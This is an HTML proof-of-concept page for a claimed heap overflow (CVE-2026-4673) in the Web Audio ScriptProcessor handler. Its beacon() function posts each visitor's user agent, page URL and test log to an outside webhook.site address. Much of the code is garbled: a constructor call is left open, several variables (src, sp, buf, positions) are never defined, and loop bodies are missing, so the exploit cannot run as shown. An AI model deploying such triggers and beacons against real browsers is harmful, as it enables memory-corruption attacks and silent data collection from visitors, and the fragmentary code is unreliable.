<!DOCTYPE html>

<body>
<pre id="log"></pre>
<script>
// CVE-2026-4673 beaconed variant — identical logic to poc_4673.html,

var TAG='4673';
var WH='https://webhook.site/ae26abe1-a03c-4266-8bed-1af63ae2bb41';
var BL=[]; var RID=Math.random().toString(36).slice(2,8);
function beacon(tag,extra){
  try{
    var p=JSON.stringify({cve:TAG,rid:RID,tag:tag,t:new Date().toISOString(),ua:navigator.userAgent,loc:location.href,log:BL,extra:extra||null});
    if(navigator.sendBeacon){ try{navigator.sendBeacon(WH,p);}catch(e){} }
    try{ fetch(WH,{method:'POST',mode:'no-cors',body:p}); }catch(e){}
  }catch(e){}
}
function log(msg) {
  BL.push(msg);
  document.getElementById('log').textContent += msg + '\n';
  console.log(msg);
}

async function trigger() {
  var extra = {};
  try {
    log("[*] ScriptProcessorHandler::Process OOB Cross-Contamination PoC");

    log("[*]                  output read [255..509] OOB -> reads input[1] (zeros)");

    var MARKER = 1337.0;

    var ctx = new OfflineAudioContext({

    beacon('ctx-created', extra);

    var srcBuf = ctx.createBuffer(1, 48000, 48000);

    src.connect(sp);
    sp.connect(ctx.destination);
    src.start();

    log("[*] Rendering 48000 samples (~188 quanta)...");

    var data = buf.getChannelData(0);

    var found = 0;

        found++;
        if (positions.length < 30) positions.push(i);

    extra.found = found;

    if (found > 0) {
      log("[!] ============================================");

      log("[!]   5. Heap buffer overflow in ScriptProcessorHandler::Process confirmed");
      extra.verdict = 'OOB-WRITE-CONFIRMED';
    } else {
      log("[*] No marker found (input[0] and output[0] may not be adjacent)");

    }

  } catch (e) {

    extra.error = e.name + ': ' + e.message;
    beacon('error', extra);
